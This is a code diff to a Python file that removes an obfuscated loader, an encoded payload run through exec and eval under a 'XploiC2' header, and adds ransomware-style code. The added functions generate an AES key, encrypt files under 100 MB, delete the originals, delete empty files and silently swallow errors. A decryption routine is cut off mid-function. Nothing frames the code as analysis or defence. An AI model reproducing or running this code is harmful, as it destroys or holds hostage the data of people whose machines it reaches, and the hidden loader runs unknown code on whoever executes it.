@@ -1,9 +1,213 @@
-#Szt00XploiC2
-import random ,base64,codecs,zlib;pyobfuscate=""
+import os
+import sys
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import binascii
+import shutil
+import socket
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(AES)'],['''{y05=BoA`><lbYp<6khvhJ0Qx+LC^)7#>h7TT?!Fx;o}**jrzgo>aL>hK%h~IT0L84tosy$j5q7ieIir1yQ9oeC7M#o@+%x1*Mr8VO+Jf{60;}-sD#g_eA9wQ=t`DF_m+zdD;GNp?EW4?Wxpw-~A&ek1Cbfr=O2LG^o?eeGLR6gsfb|%jM%;%&xHq=>QlDoRYgK!zpTjaN38%J7sPBIn?=EaB7WHBVtZ-fg@p3yZQ=XDT#!AYYt$khEb^UX_cAy8km{ErEi~?jC}HFq|7BC?{I5<`%3M>vXn0XT5TR5Z!3xHxzyo7SIc5lYN>u)d6P6|F`}$OkO69wb3*bVAc-{}-@H!iMlZ%{;gUS^8BixQA?hk=<XC5GY}ZzoCi0s+&8D@L3Q-m0z^yeD|A9d(M=FKjg&dwbeGHpS49!R`jYYM;#ySKbeY7igMqhg&v8!O1FsqgtSFL_Rn5BcF1wPQPR**iX7?4s6!fRFse%`^D!C5VxPBmFwB;+7*pVt^1?>C6yDRDV^bNP!6(1oAk>vSU$@ZsMDGTw7N&Tj@~RSFNxtVDw0v<kO?tFB_)&VbG%e|E-v-}uv*Q)tujgnAusc@bthb8xaoi3d2!4jQpcx<3)d?d`$&jrudAhXbxBdyY9=ka$^oi$mmGN~c{S8&kOoah#F!rOcgi>rU>J5|iqrV1@_A@6h?(MsY@Ph0p(Vaa3NvHMFvh3g(}Z<rwHWpd3m$EP7%D{F)Nw{~h>C?$VHC&GKyX?&?BKb0(N~tuXk!qlZ%hY>B_T!niVIe{F@NA($`LMz~XR5QDt#Ogc+7eWL2&H7+Qe?yj(b(8SEJ6;|nrUO<(`%od}Ldo}lI*;_AoV_?5$JA*si49kY2M8NtrgbfTF^(Du#9C>3CUXYoh^Toqqe#>+!4Xuyq{1fcCrY`Dr7nd&DDYy9KUZ3OMi5jI!nGqta*uC2^YaFmJ5cr%PDj>zGbu<68dZep5N=w}RE;S^ALi_~Y2J#q)z!rL?huDVr7_8dcZ)?<go`I&DFin1BS6?DtJVvtm6*CyiEh;;fUfFoahQApF8x<{E5Z2Lhzm1o^pw+q{M3&l)zh)`z%sUIWZ4ytN=aCFP5nvb2-fN_Mo@yooV^sma=C3!{$P$r&Nitm{FVf<yG^Vpwq6!>+_q`s~Te_8tmw-pyf?oV##|e|y%z5!APphhz>Hjy|@NErp@$hKf>8ZQ*G@W;h?%~b8!V{J}_rZpm*#R(Uu)85FnB>*dN=3syjDOB0vu<~91;S99jTpM$2>jBZqU7d3-&1x|(KXW_J~*pDP$DL|aDhU5y3|j^2(B0U!JEv<d!BtR#Em#<&+&Y21b;iS$LGa~>gKsPA3m{K!_V)Y(lWzRE|Z<Lye7m8f7y9Y^vk`w0VtJJriDvJMky0jU%(`5$7>uTo*^cZxA@9;-yFs3OZ4xKq8Kj&CdBul*-zi!Y`%te3W-R+8YFt6xFaC4Ga*+kl80foP$CQpEqr>l8jyW7d3LCMKT3PkUmJ<h_f(l&A=aDE>9#_LGBgg@4e9-pE#)Gop&XolC^VUC4Y%&s{8VMRb1)(c?)<r%F+Nb3&2pqk-m&29<kZ+I+&WaqteW^euBC)yZg~*#AG>M^Hpi!#zQ{?~MCr+x-S@;$6jXLMDG10{K00;)_}pLeJONu3CvEL8<TO&{H$jJ<EwcJh9Cq<rVET~=Aaw$wUTw1k<*pzmVxt>w;Y_sH-6*T-yj*od`(3?A-{?o$R;+Fe({Xs4st6xUU*Z{luz49S^Y~kpDjZv;kB3PqrB)B2Q2)R0MjB2{Wx_`|pnE<}dAjH^b^V7v%eQM$l_2jX-L}6`EMBj<Wj9c}xpY#BaB@76Mp5d*)1mCVz{1R+;+?^EqzR11zqz_=2n?!9BDmUO00BE_au8Y6Q2{m6uR#ZZlk^*7;2+GuNY3p(vkr~T7%Xo3gr!@w?8l(Hce_oA<`7ItqCBk(P)rm2QE@9-gUFT9ro5_k?Gh*8XmZty@O-T=^aXaJOND*E{G4;%Ui38Po4WOB=W{bjIP?sgVQ_H6FM}<dS1$(qwlrC^`b591i6;wgnh}RuXL_{t0v|k~lB>tb=uN5HQqy-^qwD+L;1O5_E$u;<n0QW<lai|fAk$UC5?I&)B7nl<bzi;OxE6GmF99nz=k{VBEo7<x=Mg&nn1GB+@PYi*qKO<ZAa5T0%NvGfh@K8G&Yxm-5&MQ<U6l+S^g`Wcw{{SrWy4EREV$W#jed;FPHMpJ)wst%>r0ru=dkmxoJBgl{x!>VY~r80>iODCvVk(o8nIH3H)b3hSORV(DEJ*mZCSf?-pFbq=wlAQLp}n6`Pb3jbVfORVf;G%D>f&U;<50gb&#zNPOfN!XUk5lvk<WOi`<<A;buPW7@hPGV#E#~66zP|BqAyZV$;uDJAz{#CwKXPZj)qPQUS1-*|LZfSY9|F#X=$Ro#-qA<5xx*d15#b=_t#qY>q>dH=0|(qvWmZ>-lCUVhqzzi;y_>Aqw1aP#&a?T!yo^Xz$z6P`e9A1qBC@c21d{W`JJe=K3%aY0q@_lQ((-00GSL2`{<}PPZgpBUoAq6xg0dDKyyaHiItHVFD}Ou9I+17R<JR?!J6~=P9NlJ};X#Rua%gNS{7KmWY39?CkdPak{cyO|LXu1Y~_7{f)p6^L4I8?ZgOkW@+^#_AL{O16nrk>~wZ|zMWAz--2y<VUeGGMZ6je7hb8nT0OFEiby7QHSX1uy4L8?L-a1KIdU&LjT1yP@9v)Ns+HKn^3(XVI<<lK)|hiUtSz}cgsHJoiAG6v_ljOtlwE%8Am8il$mxhtWK^P9S10H+oF-)?fy$1ThP#1scb^?*&FD90JiUtAktj9gkK~9c;}V9Y1(n|2)Y~%sIS|PoVTr%KvE23-oi;^Yap$)fRFBzMthu<3o!jIDHoxA;S(N296m<J8rYU<!jm7$zC5oKz(pe13ev(Sz?Am!jeG5{5Fb?Us>dsMDi#&+@b9O!m{;F6*SKM}~Gikb#uN~e)Xray82rBY02$ve38YOEtFr5PU(G1BNuw$M5;-XY|xggv_GV>sV8QAIKm<mIr{YX}wwZD_ED#4#M`{LHoy3BG@bx?loAP)^vRnLi><X?{x(1(Z=9v97N7*ebbd|Ci_2sr2+PS+|ej7n}g+aX+9|8c1C3^R6K5QOUp+lk|AUvdnEeELj6@LXI#fok3+_}%N90Io|0kB@Tz3hTx)f78Fq?aqk2d8&%ADTgJtTjVrIeRxt}h1t>7*GSL8za2@Lo)YV=VadWho<O=xTYY|Tq>o<oi=d%pP|iapqcvtiQEVd<W6%h1ynEtwRjd3*O~`kOu+R=~YIkVmW9CaKrGW)}#CsaROyh`tu}|y4QYh`AkTIPJ#wgf-`1}gh%4eMtW4em%)mq5O0(RlXdDWuJaO1Hnh-z*-8kZA=%cXM0y>LbY2Y8lW9~y9pn{ZxH9)g`-sbfM_3RSVo%jp0m7+nhKG?!1sxhm$HNfGc%?XebFhw~v;$3R+gD8_0Aa0eYm);<HCo{kMsYV*k9cV4#AOB(%|6GDOE!u>$L|DVg2^w3#TC^8+Cz*Y=sNV^jBHLmprei&!FBPxKV9tJl0q06`sQv1fQv#n~e#^~B-;_`v!cTiZIlp5tBlp3&#ndbuxlwI>Vb_e@4K7Q4OPx*4>o5kL=+3x@HR8id8QoGzDOiVvHBgWQ+!=|dbBwyNVXlH!`D%40bi_tETz^Ivfv|a3P$2$8iRU(ZmTT9GOxtCx-_73FK31%W<b8!81Z|+>L5c%QR=8-xK9gNAo$rYj*6fnv76$Kc*>8r_c`Tyx1{J-2ov1Y;9jpCwu#mELS`voI_(bKwpOXN-o-p*OyP~V7CEUbAd+KmLw&tVGH56vAF*kyp#^yL<J+g1yZF&(l!nft%rE}y@t$&4J<qK^w&2s5>*4pF&rZ+`D&et>&ZA-x;&E|A1J3l$=GA!z_Pujf)XIO3qU)-i%=3Q^<zrdAsaujF6$$5{?v>z_be${Un<7rQ}C7;Mj7DJj`FyKbqF-4mGhyZ-iTh44@UA*TSqNu;IIfGZeu`v&@H*ib-@f^K@Z7bmLEl46WwFiqbHjj+7lN(tyHwkfehXwJt+>)EWLVYK3x%M8rY;tUn;6uL}LjMGraej^v;S3sam*L)k{j1XL9g0P4xdk2p(u?t1p6h#2<POXQT;+$J2H^#ziRY$hbb*NMqXc&VX9jv18qT()(hH=PJJUhSz&!cCjuL@j4Q-gFa)_PibYg?CAMc0_2U!e9jFJX7F^1kN9PmOW8Xrm*9q685@ef*#(3PCz>G25wlS~F$;6v%8TPho_}8JGi!!yanKkf*C!i}i4)U)~T3p+30Fg$sX2<Oy~f!Sj<-@Z5`fmqk|t<|t}tZ;xdP`C(2i!!S=QREc4b<68Aj3&?E6vJdSTE<~?TFF04p_F-DKhyfJdcH!`|WdM;d7&}mk7c~L20O~tnZ224e<m)<D1B<i$HtVKYFC!M(j(7NATij82<44Q;lmv}qm_O>dzeR%4ZG3_<N^~cWI~<29|6^hr7V^JXlllUABHz10N(budD_DkD`A^#B*0kO~5_p$7HK)+IiMRgtx<@N5Q7+i}=F!d7v5#{&Ld-=~o)-~m-eg*Xs$}r<jUnw0z+D;phLa_;%koOLS`TXuG;Ya_Ea?9K`SePtSg8<Y;h~lWHXqJsoN(Ud*Cnzbeduc1A{mDj%!EUk8gM<Uv}`V~tJs>amG>m=AVV)R2sI5%QW@i^{Uq=fQhB;IF*a^TzN;yZo44^cpO><+m4~Wp9(T>gTdrmY|MLLoVv><7472_uObRRwk=ANv<i~ih!Se9&EQG7?i)k38$h=LzCRCI9G+Ia!6&RxB96#HyWZ%Tu9<(|!)ZaEl4#MlVX4JhaVbQo?GYVU=wOHU&32Hbm^Hul<mW^HQZU2|%x1=i}bX{mxkof#JHQ<&SG@#oi`P{FPr`jZ1sp`adycj(NDHt)7<J03P49Mk`DTW%~kJ0O4)G1Z>MmPJ9Ma;o&Ow0XxWc?4ygZpThTIjn-
-uRm%|^2&qite$ums%(_;-+BP(oyzy@KD?nP>KItiP_$Mt`UP(%((x1@1Y1sM7#hNWON`Ht{CR4*L)i4?yl}kLT}p!Vn<?b)T3cO~q)nswDT5L-AaE93vunz`4$)=c1*4MZcrOlHae$wy!^!oj8+R=z`c3qA#ZYzVABBpQ&84!dx1R~iZ37r!+UeF^QsJuhe9pD^cl(HP16Jnu2#h5)nP(lLxn|7E{T8Sm%!mlFFr>8R$<cb!^l}Oxy!w8LPMKx+<PE#P?I;ewv3#f>L1plP+);-w+f@YtqDbA=v+W|v`{d@%kroH;TOZF9j7KxR)$_sd&Lf^c`n@2<xtBAP1sYy)DzehPb!!_F-l~ehcqV*qWvoGAc}1A&+JCR;Pp4?-1dn&r<)qdvM<#Y89Mi}14^pt$l!WDaE!PCNk-vC>fTu?d?!Jbt%w?Gll01WS9QuDCF!>4wsGcCsG=%*+i;W5gnniN6<E*sy_@~D7LO8RHoN*s|7n}d7x7_4I@|+8Hb&H#=n3W9|?mapC*&i|XL>p=k9j8mmoH-KOG_)8LLS-QG-B>=rqaI{Ho2htHcL_ifJ?TZ`z#J7A&FOzcW+gG{O1{&CDSZ^e<+c-@kl7GXgR#<#JPe7T6;?<QomfX7Kcy)7h}P>gLuuoSJawz7ty2h3;(yon4n?}5jp!(0ejZFgb8P#)K^k7JM>`5)7b0;9x6Wth$DK$VM|MO84Rayj5E<0qD`BBaNjjy2lCo~-$vNeiGlmfDB_2`OY`2^ZMC|A=rv2>vRxDzA5gn4j33jNt@jzQ^z%{?tV;Qo^_z~!Z2;@6c6&942`FX(~-*1kjiH-tqMTLbF5JH*6tm~+P9nw>4Wc&TC;5NK@*DWtJ5XlmAG$)_YoSPLmds4KMJftao{UW_oipJqy7rVXL$F!mPpFhQFOVObNAqJ^2#lI2Gb>?`;N#n!$@e%w9-n&Fw{OfVMMp|fYM+EH7W4UqGrTO~e`$waRnyo(b?^{G_eORjv#-qEkEVOSoI*pEp$$S=yzrLfqzV=9MQeqEB?GJ|Bnk=xd|3=9FrS`{W$qSqO#jG*l;NDe83+CxMvx+bA-AunpxlG(6#itHQHXHh^@cG>)PO&e+QX#q83J|}S5goLR(KZ0}lZz}r`uCk*$C%sPHHHG3h_?}?%RVn~aVfTm=)qfRuEd3x0yownbSCWD2N|B&4I-PMND>@;G*3qYyzOt3STvyooqLKIw_!Z-rP|{?{>QiK4UY(G1ZD+|MY)FB+>GszdL6_wh2umUVaM;?g%1%Kf}z5~0X6GldQ%6J#O*NJIAIXXqu`^!;9~*u#FZjuXuXwCbmq^@nUNJ6;(*<hd~nbYrK<aUq^vm63Ll=x^?V+K?D426QZTY^;_D&K&Fpeio3V4)y9K8}Y0?x3fNqAbWaL(ZCbRI&!!Ebe%S(a8n%ICG(dxK?(F9^B-sX{FCO$j7s41nOl&%Yyp6=++-GV2EmoYYH7P+<xw`%G=m){1rFb&29xKuWXAUmoF5@jiS_=mN+hl1r1T-gexxYS_6vS)WM8yb%jC(Z*(UX(>-c@{Fgz405Fy-30@w|5KH%+^o@ap2S>2oopf1JXyGtiD1|+3f&!@$>%pcpjw^r^z5|5wPOy4n3;3KJT4@=D?9aY*qWy^{KC==6}*#Wi3{5p`PE3%e=;*<bnX4D{UjXPX)yZ2@;k;7cBA0wBjKMN!GzO2ui^mC$@$%O_apriC5wbhP+@CpE-%yMk?3(-E7hz{-_YiDfLG~T?A>5I`Rz>8kPM;P#@L`$|Wx0L7H^YG=bGFsv1Q<DIk*4h6|=n9?6Kn)eJF;J=+X!5hHCCI>0a2g-M%x3V~pghM@Ote{qv_rCM#Ay%+|>e{ERiK~vwnDok8z!KWkXOq0tpmP~OG3Th{*w&x99d+8;iWq8)=WH9(Q&%+o;tn*W?&Z3t(*an=q$b1bcxr+Di@6{y~O8T7Id+_vf?~KrWssGQHP@HA+VArR8gg^Ghkr%ejA{MhLlyIaQzzqYkMD$}tb|f7I^lBb1!Rc;~NLeOJk^APUKqMY8c}AFR;cYoicmxkMg}ouc_5>mfKW_X(EqK)N+}Ltzw9%B$t&P^jnE|WF93ulcyY55uf|ww0$Ko|46?8)m^Hi~WKQN9S_R;?hu+ojXq0kiWwhCOcnW1vD1pChv_$#mI#%}_^l*;g^oiHd83mo+btTOhPH1VEe(}It<;Siauf_pXU<LI2OdWd^WF;&8bNac#B7cHTBJz?EWwLAgv<9R_L^r+^_s3XGM>}FrALRQM1?jviO$z7Xlhq7JpsqRn9#AY4~E=9?2`~_zL{z?9_ACCesTu(zuh557}h<;~8X;Po~5OHlAlky!m7kWsvN;GL8P%I7mO#7_MuuQs{O}Sk0<5&Q_U%0qMA3q2l62YKf0dKA1NGXn<@SY_6-J+{97_eRICgCC_<V3Z-^2Zx160j6XtbL^pYgA8glg7CfEqSY94SjVvJt@^*YW*E_V1~v^L(nF2S3B8aSs1Fb;PCsa&$^<Mz{WQveZx|>il^-gpskh4G3J_I{1SQeycS<U^W#P~m|5`#gElt6aj_>Z^t?D)3}6}$==AC=qR}~Ss9d5D+2AwoXU1Dj7nv!ur?kADp-?MU#{A?UM5IH#v`IlDbB`_-L$|B;h>}T0kyZbwmJ!*<yzF-x>1Adv^6MOD{#g5`MkhbhrzxD?)5U{{;}YieOn+`I&_YRv{E+9f%M%x<`W!dq=hJ#Mp>fCo?$iUO5o_2-fRT;WuD5BG&XK;rHM;Y_oVbsY^FSZD9w710DsuSXm+5|5lxv0XAh~>)^F=nfXKKh|!$>(lV1?LEW}I=USK2m?e-{MIe;i8me{H*eFj^afx$XIx%wW4{s-5x?-oV1mHm_^QaIJ5<S=;q^cSxe!pKe-)2XQ8w@onK&Y7qdH&(VPD;<iPt7?JA<^TRzi@mo*KzT9NlWi$aI=S{X$kY(6I)*&e|p|p?F0tSS@MQlE2IeMp&%XbzSmI0zH<2|rsSl~fL9kaKT(b>ss{*Ti%MdfLth30t$;@qHcfLqu)*dd*JrTz(@H~{_V5V`iCt9Q`^LAX0>#o|!$gl;$T7ai)ZeJDf5!qzhWdxpd1<D+rO#l1w6W?Haxb9&?6i>$`dv10rKyAIEyXUxtSV6*8&H-v<n3AXBLc+hKo2~csP_&?s0HwXbcWGUX*C*ltD<pVsW%QcO27-m1ibK0y0=Z_?>gFIZR#c(vK?@syn3pYo7`P0$~l#h4?Oq!>WLYr$Fs-#34F(p*IDhdHe^BopFg}6ni8;9w_As{I<N}1zjKjAlCW{!OgT@9I>hMXPb06E+XDQRf<X|L1GSwvoC9&d9yWCdsUKrY=?LvAVv22n}ZFjpR?$|hd9dHtZRhK^>9$BhrG&=hK3L)GqCSSsj=Lgi-pDGzgWZW;bujW@>sAr69~m6hi@y(d=nt`!$6Dp`}=;bruLu?X<Rr(=bYHnF}DEf?DHZ<l4w`ONULPE)rhZ(MIEevgn>jsZ<I`wA#{wMi99bCSqgO{;Sp@Bbl`J2M-~3}c6L?pIoHU&R^tVV;>astUGlG!wp<5KM~ABn5k(cNC9g=(eSNs$Y~o&+X$?gs=i{s}j9<_b&(9kgh1N1D8AeYo2h~GGYIsuuq0ByS@7wbY@^=hCtdPD`3<j)A~%0vM_)?#EvAU048lpHjKA1#@hBE@wRLVPCt-SI`;za(+~jn<y9EY5|*5)Yt%H+@1AcJO%a}H$Qcg&e3aM$MuEY}|K$_>{AGc#8)=y0iEBpMJ*fI3zmZlHRuG0_WRN+TH54m_R4-3E6@^hiO1dHHD+&o|pE6R>vC)Nqvy*yB9FLTU+#FjuQ}IK2B2x%_dve{YXgF#A3q772l$?*lN=j9OI4PrsZ01fq32>aP79V0kZvUkBBeF82d;U!zG5}zljM(_vyt42qMNJRqd?K9e#<Ml_g#H9v%wkLi{hpd;+qc6vua;bDh$Jy>*xuM1qqM0rt=;CONkZn@>tYgCB0lRmW2e!#5!z`-XVUz*MI(dkm5Ycp{|>7hyqEz8K5h>V>tVfO#5c8V*)?`xzuGfa+83sY0z=|2jrpHN!w$XtM=$k-^ifl<)n^&n&2dOS0X5qA1{7u|c3uv+GPc<fTy?Zv-8(b=P#{bvT1=EEd2V~>IDuUF{oNZT9elca%SdRTh|3CYpaptbF9+AVHmodNO4*v<oe=$S`Q(FkehpcPp^f`3wjK~<V$P+@7M9$?xj6mbmqB&a9{in3lrUE$oJwzvu4qN8Pu>$Y+(TWe2yOGFf7Bvp<ZcT$7`q(&*&lb8AY&_^O8~IO#eD(up?*x8HHH#YVn|UMTSoUb>AT99B3vDUmJ*1U4KErdS+$gE=2)hNBgYn1(EuX&W1W;?DADhfrSTpq9Sb#sdTKgofuXo)5V|j}>f&1BziknrRpHoIrzW@U6Q@;O{2<;e;wUSbWmNtG4!MCaS{Ew>)KF}+3)8HLR~B_5i6A}P*%42a2i>;70m^*9qH^M=M4u2juuEyvZQK=6S9c0(5mVTm;Vjh@Z;}}n>;0!L>RG;lUBga=1j;^58is-}(%*dvTx9kQEFaI~{=u`W{xU}QAset4)ai;IigLAFIR|C2%wF%@B@sYy0(M<7xO5Uy0CmD$j;AMnU(a(`)NVFE5osY20v~5U=7)T#`%Rr|ul~=j6K@ye-
-Bge5-y0pOleadl(1izAV?!cJI$s?^k10Gy#MPi$iy`BX<ax;b<tY<bBP)LDAY)R*<|=V+hnq}<YRv3G2?<B7KP?Bj^=Ga<4FlqS@60%{Q08n}IRYhpK<5!tmyIr5(vti&ReYCp155LRym5TsrEZ3*jAya!m{5f1s8Y))mQl(iS$14_rv47`LgpZ6kh}Uc74Kyt;nLKOIq5O55i)3D)bOE+Vm6&;z0DYf1b1&X-s2b%2gHji?Lc+FEyg0<Fk#|wEaa7mR4Jj5G277?chWds`~F!F<wPm(9Qn@5mvsZf5_=UAM1*HfF!pJV*luOO|76yl1u{gX^x~~^GE$OX7fz5Ib$ySirqtE88MeJbCGO8@<e=J~xYvwb%Ey9?xZu#ZZgKRmr5gnN%VL|Fj-voB?{<GMzu2LBLKXFLfm07Zx1}2c5>5LiK2U$>B`BR~@bX5ml9x21TbiE%{ikMZ`uDI@D_IpAZSvV=18x&#9fLUB6BKv%2f}Q0xg+u1y7_jfhI4YMo*B`sX)V5~2-exoE!;t94|{1K_L7Cc1>33-eM~#oC2mx5TWEtZ!|;5X!Npc{W9Vp%(kdSo74ZE=EvXSzxZk+tm}_qLa|}m*NMU4n1ob3v)U!P=KDhYTXJWZ(q;bg?-1o(FbG6U{iAiH{FM;Qd=I%eW{9A}jNq@gL$4NZ+q|zrC2N>Ps=-g4;tJH#GRplbrDZQ!9$O7|sF*n>}3LSbjkXRkXEH24D9IXFF<CU;3fJ=2B{t`wMoigDoY<}jC`J%|!S{39A`HFy?!z`K{8U>uAG17c!>e$vMe%OU!lu$!j?+=?rO&DP1i8!+%$^6C)NMsRHk>bhsx$7}!j;1r8_rfW-73bG=aDG`9ytGq>Dq^t(pR%7hLU;hx&oCDc0^1i}C4~Z%C>|Xh)cs&mV47{l{o#;0!zKx7vtorzGKNcT=)gwLQk2~Plh@0MqCZ#|w8=iS?jgH4f^hx>$olSO)1)7aY;=hT-ShlhaXnhHqN`>qa3Ee+6b22hf{<8K?thy1y1u6*%?OLYYIwuAL`u2@2W}g3R9^+j4&yTImlkEdAsDLgJRYCS#kKWN){L<V(s>#av?&molX`%q{4PIVL4xVrnt_y!#(Df{+QymTU8B>8t-V#<6#jstWx{c0p!x4_z-|'''.replace('\n','')]))
+# Function to generate a random AES key
+def generate_aes_key():
+    return get_random_bytes(32)
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
-                
+# Function to encrypt a file
+def encrypt_file(file_path, aes_key, encrypted_extension):
+    try:
+        # Check if the file size is empty
+        if os.path.getsize(file_path) == 0:
+            # Delete the file
+            os.remove(file_path)
+
+        # Check if the file size is less than 100Mb before encrypting
+        elif os.path.getsize(file_path) < 100000000:
+            # Prevent the file from re-encryption
+            if file_path.endswith(encrypted_extension):
+                return
+
+            encrypted_file_path = file_path + encrypted_extension
+            iv = get_random_bytes(16)
+            cipher = AES.new(aes_key, AES.MODE_CFB, iv)
+
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+
+            encrypted_data = cipher.encrypt(file_data)
+
+            with open(encrypted_file_path, 'wb') as file:
+                file.write(iv + encrypted_data)
+
+            # Delete the file
+            os.remove(file_path)
+
+    except Exception as e:
+        pass
+
+# Function to decrypt a file
+def decrypt_file(file_path, aes_key, encrypted_extension):
+    try:
+        # Check if the file has the expected encrypted extension before decrypting
+        if not file_path.endswith(encrypted_extension):
+            return
+
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+
